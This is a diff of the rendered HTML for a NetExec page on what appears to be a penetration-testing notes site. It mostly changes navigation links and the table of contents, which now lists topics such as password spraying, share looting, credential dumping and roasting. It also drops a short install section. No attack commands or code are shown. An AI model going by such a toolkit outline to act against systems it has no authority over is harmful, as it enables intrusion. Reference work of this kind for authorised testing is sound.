+    <li class="md-nav__item">
+      <a href="../../exploitation/shells/bind-reverse-shells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bind & Reverse Shells
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../exploitation/shells/escaping-restricted-shells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Escaping Restricted Shells
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../exploitation/shells/web-shells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Shells
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Priv Esc
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Priv Esc
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../privilege-escalation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Overview
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../privilege-escalation/situational-awareness/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Situational Awareness
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -2530,12 +2416,33 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_2_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_6_2">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_3">
             <span class="md-nav__icon md-icon"></span>
             Linux
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../privilege-escalation/linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Overview
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
             
               
                 
@@ -2607,6 +2514,27 @@
   
   
     <li class="md-nav__item">
+      <a href="../../privilege-escalation/linux/capabilities-ldpreload/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Capabilities, LD_PRELOAD & PATH
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../privilege-escalation/linux/kernel-exploitation/" class="md-nav__link">
         
   
@@ -2648,12 +2576,10 @@
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_3" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_4" >
         
           
-          <label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_6_4" id="__nav_6_4_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -2664,12 +2590,33 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_3_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_6_3">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4">
             <span class="md-nav__icon md-icon"></span>
             Windows
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../privilege-escalation/windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Overview
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
             
               
                 
@@ -2782,12 +2729,10 @@
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_4" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_5" >
         
           
-          <label class="md-nav__link" for="__nav_6_4" id="__nav_6_4_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_6_5" id="__nav_6_5_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -2798,12 +2743,33 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_4_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_6_4">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_5">
             <span class="md-nav__icon md-icon"></span>
             Active Directory
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../privilege-escalation/active-directory/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Overview
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
             
               
                 
@@ -2931,27 +2897,6 @@
 
               
             
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../privilege-escalation/active-directory/persistence/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Persistence
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
           </ul>
         </nav>
       
@@ -2986,12 +2931,120 @@
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
         
           
           <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Lateral Movement
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            Lateral Movement
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../lateral-movement/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Overview
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../lateral-movement/windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../lateral-movement/active-directory/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -3002,8 +3055,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_7">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
             <span class="md-nav__icon md-icon"></span>
             Persistence
           </label>
@@ -3063,6 +3116,27 @@
   
   <span class="md-ellipsis">
     Windows
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../privilege-escalation/active-directory/persistence/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory
   </span>
   
 
@@ -3161,12 +3235,10 @@
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
         
           
-          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -3177,8 +3249,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_8">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
             <span class="md-nav__icon md-icon"></span>
             Data Exfiltration
           </label>
@@ -3273,26 +3345,24 @@
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
         
           
-          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
             
   
   <span class="md-ellipsis">
-    Port Forwarding & Tunneling
+    Tunneling
   </span>
   
 
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_9">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_10">
             <span class="md-nav__icon md-icon"></span>
-            Port Forwarding & Tunneling
+            Tunneling
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
             
@@ -3390,10 +3460,10 @@
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" checked>
         
           
-          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="">
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="">
             
   
   <span class="md-ellipsis">
@@ -3404,8 +3474,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="true">
-          <label class="md-nav__title" for="__nav_10">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_11">
             <span class="md-nav__icon md-icon"></span>
             Tools
           </label>
@@ -3443,7 +3513,49 @@
         
   
   <span class="md-ellipsis">
-    Bloodhound
+    BloodHound
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../applications/tools/burp-suite/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Burp Suite
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cadaver/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    cadaver
   </span>
   
 
@@ -3464,7 +3576,7 @@
         
   
   <span class="md-ellipsis">
-    Command-line Shells
+    Command-Line Shells
   </span>
   
 
@@ -3486,6 +3598,69 @@
   
   <span class="md-ellipsis">
     Impacket
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../kerbrute/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    kerbrute
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ldapsearch/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    ldapsearch
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploit/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit
   </span>
   
 
@@ -3528,6 +3703,27 @@
   
   <span class="md-ellipsis">
     Mimikatz
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../msfvenom/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MSFVenom
   </span>
   
 
@@ -3590,28 +3786,37 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#installing-netexec" class="md-nav__link">
-    <span class="md-ellipsis">
-      Installing NetExec
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#core-syntax" class="md-nav__link">
     <span class="md-ellipsis">
       Core Syntax
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Core Syntax">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      Authentication
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Authentication">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#protocols" class="md-nav__link">
+  <a href="#kerberos" class="md-nav__link">
     <span class="md-ellipsis">
-      Protocols:
+      Kerberos
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#certificates" class="md-nav__link">
+    <span class="md-ellipsis">
+      Certificates
     </span>
   </a>
   
@@ -3623,55 +3828,100 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#authentication-methods" class="md-nav__link">
+  <a href="#dns-helpers" class="md-nav__link">
     <span class="md-ellipsis">
-      Authentication Methods
+      DNS Helpers
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#smb-examples" class="md-nav__link">
+  <a href="#spraying" class="md-nav__link">
     <span class="md-ellipsis">
-      SMB Examples
+      Spraying
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="SMB Examples">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SMB">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#validate-credentials" class="md-nav__link">
+  <a href="#access-check" class="md-nav__link">
     <span class="md-ellipsis">
-      Validate Credentials
+      Access Check
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#enumerate-shares" class="md-nav__link">
+  <a href="#shares-and-files" class="md-nav__link">
     <span class="md-ellipsis">
-      Enumerate Shares
+      Shares And Files
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#download-file" class="md-nav__link">
+  <a href="#share-looting" class="md-nav__link">
     <span class="md-ellipsis">
-      Download File
+      Share Looting
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#upload-file" class="md-nav__link">
+  <a href="#command-execution" class="md-nav__link">
     <span class="md-ellipsis">
-      Upload File
+      Command Execution
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-dumping" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credential Dumping
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#host-domain-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Host / Domain Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#laps" class="md-nav__link">
+    <span class="md-ellipsis">
+      LAPS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#relay-coercion-prep" class="md-nav__link">
+    <span class="md-ellipsis">
+      Relay / Coercion Prep
     </span>
   </a>
   
@@ -3683,28 +3933,46 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#remote-code-execution" class="md-nav__link">
+  <a href="#ldap" class="md-nav__link">
     <span class="md-ellipsis">
-      Remote Code Execution
+      LDAP
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Remote Code Execution">
+    <nav class="md-nav" aria-label="LDAP">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#over-smb" class="md-nav__link">
+  <a href="#enumeration" class="md-nav__link">
     <span class="md-ellipsis">
-      Over SMB
+      Enumeration
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#over-winrm-powershell" class="md-nav__link">
+  <a href="#roasting" class="md-nav__link">
     <span class="md-ellipsis">
-      Over WinRM (PowerShell)
+      Roasting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound" class="md-nav__link">
+    <span class="md-ellipsis">
+      BloodHound
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#misconfiguration-hunts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Misconfiguration Hunts
     </span>
   </a>
   
@@ -3716,63 +3984,54 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#pass-the-hash-pth" class="md-nav__link">
+  <a href="#winrm" class="md-nav__link">
     <span class="md-ellipsis">
-      Pass-the-Hash (PTH)
+      WinRM
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#kerberos-authentication-tgt-based" class="md-nav__link">
+  <a href="#mssql" class="md-nav__link">
     <span class="md-ellipsis">
-      Kerberos Authentication (TGT-based)
+      MSSQL
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#ad-enumeration-via-ldap" class="md-nav__link">
+  <a href="#other-protocols" class="md-nav__link">
     <span class="md-ellipsis">
-      AD Enumeration via LDAP
+      Other Protocols
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#modules-you-should-know" class="md-nav__link">
+  <a href="#modules" class="md-nav__link">
     <span class="md-ellipsis">
-      Modules You Should Know
+      Modules
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#cleanup-post-exploitation-hygiene" class="md-nav__link">
+  <a href="#credential-database" class="md-nav__link">
     <span class="md-ellipsis">
-      Cleanup (Post-Exploitation Hygiene)
+      Credential Database
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#netexec-cheatsheet" class="md-nav__link">
+  <a href="#operational-notes" class="md-nav__link">
     <span class="md-ellipsis">
-      NetExec Cheatsheet
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#recommended-operator-workflow" class="md-nav__link">
-    <span class="md-ellipsis">
-      Recommended Operator Workflow
+      Operational Notes
     </span>
   </a>
   
@@ -3794,11 +4053,53 @@
   
   
     <li class="md-nav__item">
+      <a href="../../applications/tools/nikto/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nikto
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../nuclei/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
     Nuclei
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../password-cracking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password Cracking
   </span>
   
 
@@ -3836,95 +4137,32 @@
   
   
     <li class="md-nav__item">
-      <a href="../wmiexec/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    WMIexec
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../cadaver/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    cadaver
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../kerbrute/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    kerbrute
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../ldapsearch/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    ldapsearch
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
       <a href="../rpcclient/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
     rpcclient
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wmiexec/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WMIExec
   </span>
   
 
@@ -3968,28 +4206,37 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#installing-netexec" class="md-nav__link">
-    <span class="md-ellipsis">
-      Installing NetExec
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#core-syntax" class="md-nav__link">
     <span class="md-ellipsis">
       Core Syntax
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Core Syntax">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      Authentication
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Authentication">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#protocols" class="md-nav__link">
+  <a href="#kerberos" class="md-nav__link">
     <span class="md-ellipsis">
-      Protocols:
+      Kerberos
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#certificates" class="md-nav__link">
+    <span class="md-ellipsis">
+      Certificates
     </span>
   </a>
   
@@ -4001,55 +4248,100 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#authentication-methods" class="md-nav__link">
+  <a href="#dns-helpers" class="md-nav__link">
     <span class="md-ellipsis">
-      Authentication Methods
+      DNS Helpers
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#smb-examples" class="md-nav__link">
+  <a href="#spraying" class="md-nav__link">
     <span class="md-ellipsis">
-      SMB Examples
+      Spraying
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="SMB Examples">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SMB">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#validate-credentials" class="md-nav__link">
+  <a href="#access-check" class="md-nav__link">
     <span class="md-ellipsis">
-      Validate Credentials
+      Access Check
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#enumerate-shares" class="md-nav__link">
+  <a href="#shares-and-files" class="md-nav__link">
     <span class="md-ellipsis">
-      Enumerate Shares
+      Shares And Files
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#download-file" class="md-nav__link">
+  <a href="#share-looting" class="md-nav__link">
     <span class="md-ellipsis">
-      Download File
+      Share Looting
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#upload-file" class="md-nav__link">
+  <a href="#command-execution" class="md-nav__link">
     <span class="md-ellipsis">
-      Upload File
+      Command Execution
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-dumping" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credential Dumping
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#host-domain-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Host / Domain Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#laps" class="md-nav__link">
+    <span class="md-ellipsis">
+      LAPS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#relay-coercion-prep" class="md-nav__link">
+    <span class="md-ellipsis">
+      Relay / Coercion Prep
     </span>
   </a>
   
@@ -4061,28 +4353,46 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#remote-code-execution" class="md-nav__link">
+  <a href="#ldap" class="md-nav__link">
     <span class="md-ellipsis">
-      Remote Code Execution
+      LDAP
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Remote Code Execution">
+    <nav class="md-nav" aria-label="LDAP">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#over-smb" class="md-nav__link">
+  <a href="#enumeration" class="md-nav__link">
     <span class="md-ellipsis">
-      Over SMB
+      Enumeration
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#over-winrm-powershell" class="md-nav__link">
+  <a href="#roasting" class="md-nav__link">
     <span class="md-ellipsis">
-      Over WinRM (PowerShell)
+      Roasting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound" class="md-nav__link">
+    <span class="md-ellipsis">
+      BloodHound
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#misconfiguration-hunts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Misconfiguration Hunts
     </span>
   </a>
   
@@ -4094,63 +4404,54 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#pass-the-hash-pth" class="md-nav__link">
+  <a href="#winrm" class="md-nav__link">
     <span class="md-ellipsis">
-      Pass-the-Hash (PTH)
+      WinRM
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#kerberos-authentication-tgt-based" class="md-nav__link">
+  <a href="#mssql" class="md-nav__link">
     <span class="md-ellipsis">
-      Kerberos Authentication (TGT-based)
+      MSSQL
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#ad-enumeration-via-ldap" class="md-nav__link">
+  <a href="#other-protocols" class="md-nav__link">
     <span class="md-ellipsis">
-      AD Enumeration via LDAP
+      Other Protocols
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#modules-you-should-know" class="md-nav__link">
+  <a href="#modules" class="md-nav__link">
     <span class="md-ellipsis">
-      Modules You Should Know
+      Modules
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#cleanup-post-exploitation-hygiene" class="md-nav__link">
+  <a href="#credential-database" class="md-nav__link">
     <span class="md-ellipsis">
-      Cleanup (Post-Exploitation Hygiene)
+      Credential Database
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#netexec-cheatsheet" class="md-nav__link">
+  <a href="#operational-notes" class="md-nav__link">
     <span class="md-ellipsis">
-      NetExec Cheatsheet
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#recommended-operator-workflow" class="md-nav__link">
-    <span class="md-ellipsis">
-      Recommended Operator Workflow
+      Operational Notes
     </span>
   </a>
   
@@ -4174,255 +4475,1143 @@
   
 
 
-<h1 id="netexec-fork-of-crackmapexec">NetExec (Fork of CrackMapExec)<a class="headerlink" href="#netexec-fork-of-crackmapexec" title="Permanent link">&para;</a></h1>
+<h1 id="netexec">NetExec<a class="headerlink" href="#netexec" title="Permanent link">&para;</a></h1>
 <div class="admonition tip">
 <p class="admonition-title">NetExec replaces CrackMapExec</p>
-<p>NetExec (<code>nxc</code>) is the actively maintained fork of CrackMapExec (<code>cme</code>). Commands are near-identical — just replace <code>cme</code> with <code>nxc</code>. Use <code>nxc</code> on new installs; <code>cme</code> still works but is no longer maintained.</p>
+<p>NetExec (<code>nxc</code>) is the actively maintained fork of CrackMapExec. Most commands from CrackMapExec transfer neatly, but protocol support and option names have moved. Verify with <code>nxc &lt;protocol&gt; --help</code> on the version you are using.</p>
 </div>
 <hr />
-<h2 id="installing-netexec">Installing NetExec<a class="headerlink" href="#installing-netexec" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/Pennyw0rth/NetExec
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">cd</span><span class="w"> </span>NetExec
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>pip3<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
-<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>python3<span class="w"> </span>setup.py<span class="w"> </span>install
-</code></pre></div>
-<blockquote>
-<p>Optional: Set up a Python virtualenv to isolate dependencies.</p>
-</blockquote>
-<hr />
